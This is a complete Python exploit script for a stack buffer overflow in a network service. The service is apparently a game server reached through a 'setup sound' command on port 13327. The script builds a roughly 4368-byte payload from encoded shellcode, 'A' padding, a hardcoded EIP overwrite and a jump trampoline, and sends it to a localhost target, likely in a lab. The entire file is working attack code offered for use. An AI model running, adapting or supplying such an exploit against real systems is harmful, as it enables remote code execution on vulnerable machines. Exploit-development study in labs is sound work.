#! /usr/bin/env python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',13327))
print(s.recv(1024))

# bad characters '\x00\x20'
shellcode =  ""
shellcode += "\xdb\xd3\xd9\x74\x24\xf4\x58\x31\xc9\xbb\x6d\x6e"
shellcode += "\x81\xd1\xb1\x12\x31\x58\x1a\x83\xe8\xfc\x03\x58"
shellcode += "\x16\xe2\x98\x5f\x5a\x26\x81\xf3\x1f\x9a\x2f\xf6"
shellcode += "\x2f\x7a\x26\x17\x82\x03\xaf\x83\x75\x7b\xcf\x33"
shellcode += "\x87\xeb\xcd\x33\x96\xb7\x58\xd2\xf2\x21\x02\x45"
shellcode += "\x52\xf9\x3b\x84\x17\xc8\xbb\xf5\x9f\x6b\xbb\xe9"
shellcode += "\x9f\x8b\x32\xea\x61\x60\x48\x2c\x82\x7b\xe0\xd3"
shellcode += "\x88\x04\x5b\xa5\xf2\x9c\xed\xb9\x44\x9d\xdc\x42"
shellcode += "\x5b\x43"

buf = (4368 - len(shellcode)) * 'A'
print len(buf)
eip = '\x87\x60\x13\x08'
buf2 = '\xcc\x90\x83\xc0\x0c\xff\xe0' # add eax,12 / jmp eax

s.send('\x11(setup sound ' + shellcode + buf + eip + buf2 + '\x90\x00')

s.close()
